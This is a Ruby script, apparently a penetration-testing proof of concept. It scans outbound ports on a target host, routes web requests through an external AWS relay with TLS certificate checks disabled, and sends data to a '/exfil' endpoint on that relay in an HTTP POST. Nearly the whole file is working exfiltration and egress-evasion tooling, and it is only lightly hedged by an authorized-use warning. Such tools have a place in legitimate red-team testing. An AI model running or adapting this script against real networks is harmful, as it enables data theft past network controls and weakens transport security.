#!/usr/bin/env ruby

# Version 1.4
require 'socket'
require 'timeout'
require 'net/http'
require 'uri'
begin
  require 'nmap/program'
rescue LoadError
  puts "Warning: ruby-nmap gem not installed. Falling back to basic port scanning. Install with: gem install ruby-nmap"
end
begin
  require 'httparty'
rescue LoadError
  puts "Warning: httparty gem not installed. Advanced proxying unavailable. Install with: gem install httparty"
end
require 'logger'

# Configuration
TARGET_HOST = ARGV[0] || "example.com"
PORTS_TO_SCAN = [21, 22, 80, 443, 53, 8080]
TIMEOUT = 2
AWS_RELAY = "your-ec2-public-ip"
RELAY_PORT = 8080
WEB_URL = ARGV[1] || "https://example.com"
MAX_RETRIES = 3

WARNINGS = <<~WARNING
  Authorized Use Only: This should only be run in environments where you have explicit permission (e.g., your own network or a test lab).
  Legal Compliance: Penetration testing without consent is illegal in most jurisdictions.
  Enhancements: Using ruby-nmap for detailed port scanning, Net::HTTP for robust HTTP handling, and httparty for advanced proxying (v1.4).
WARNING

logger = Logger.new('pentest.log')
logger.level = Logger::INFO
puts "Logging to pentest.log..."

def port_open?(host, port, logger)
  begin
    Timeout.timeout(TIMEOUT) do
      socket = TCPSocket.new(host, port)
      socket.close
      logger.info("Port #{port} is open on #{host}")
      return true
    end
  rescue Timeout::Error, Errno::ECONNREFUSED, Errno::EHOSTUNREACH
    logger.debug("Port #{port} is closed or unreachable on #{host}")
    return false
  end
end

def scan_ports(host, ports, logger)
  if defined?(Nmap::Program)
    logger.info("Scanning ports with Nmap...")
    open_ports = []
    Nmap::Program.scan(hosts: host, ports: ports) do |nmap|
      nmap.each_host do |h|
        h.each_port do |p|
          open_ports << p.number if p.state == :open
        end
      end
    end
    open_ports
  else
    logger.info("Falling back to basic port scanning...")
    ports.select { |port| port_open?(host, port, logger) }
  end
end

def surf_web_via_relay(relay, relay_port, url, logger)
  uri = URI(url)
  retries = 0
  begin
    logger.info("Attempting to surf #{url} via relay #{relay}:#{relay_port}")
    http = Net::HTTP.new(uri.host, uri.port, relay, relay_port)
    http.use_ssl = (uri.scheme == "https")
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.open_timeout = TIMEOUT
    http.read_timeout = TIMEOUT
    response = http.get(uri.path.empty? ? "/" : uri.path)
    logger.info("Successfully fetched #{url}")
    puts "Web response from #{url} via relay:\n#{response.body.lines.first(5).join}"
  rescue Net::OpenTimeout, Net::ReadTimeout, Errno::ECONNREFUSED => e
    retries += 1
    if retries <= MAX_RETRIES
      logger.warn("Attempt #{retries}/#{MAX_RETRIES} failed: #{e.message}. Retrying...")
      sleep 1
      retry
    else
      logger.error("Web surfing failed after #{MAX_RETRIES} retries: #{e.message}")
    end
  rescue => e
    logger.error("Unexpected error while surfing: #{e.message}")
  end
end

def surf_web_with_httparty(relay, relay_port, url, logger)
  if defined?(HTTParty)
    begin
      logger.info("Attempting advanced proxying with HTTParty for #{url}")
      response = HTTParty.get(
        url,
        http_proxyaddr: relay,
        http_proxyport: relay_port,
        timeout: TIMEOUT
      )
      logger.info("Successfully fetched #{url} with HTTParty")
      puts "HTTParty response from #{url}:\n#{response.body.lines.first(5).join}"
    rescue => e
      logger.error("HTTParty surfing failed: #{e.message}")
    end
  else
    logger.warn("HTTParty not available. Skipping advanced proxying.")
  end
end

def exfiltrate_via_http(relay, port, data, logger)
  begin
    socket = TCPSocket.new(relay, port)
    request = "POST /exfil HTTP/1.1\r\nHost: #{relay}\r\nContent-Length: #{data.length}\r\n\r\n#{data}"
    socket.write(request)
    response = socket.read
    logger.info("Exfiltration response: #{response}")
    puts "Exfiltration response: #{response}"
  rescue => e
    logger.error("HTTP exfiltration failed: #{e.message}")
  end
end

puts WARNINGS
logger.info("Scanning outbound ports to #{TARGET_HOST}...")
open_ports = scan_ports(TARGET_HOST, PORTS_TO_SCAN, logger)
if open_ports.empty?
  logger.warn("No open outbound ports found.")
  exit
else
  logger.info("Open ports: #{open_ports.join(', ')}")
end

relay_port = open_ports.find { |p| [80, 443, 8080].include?(p) } || open_ports.first
logger.info("Using port #{relay_port} for relay communication...")

surf_web_via_relay(AWS_RELAY, RELAY_PORT, WEB_URL, logger)
surf_web_with_httparty(AWS_RELAY, RELAY_PORT, WEB_URL, logger)

DATA_TO_EXFILTRATE = "Sensitive document data: TOP SECRET"
logger.info("Attempting HTTP exfiltration to #{AWS_RELAY}:#{RELAY_PORT} (PoC)...")
exfiltrate_via_http(AWS_RELAY, RELAY_PORT, DATA_TO_EXFILTRATE, logger)

logger.info("Proof of concept complete (v1.4).")
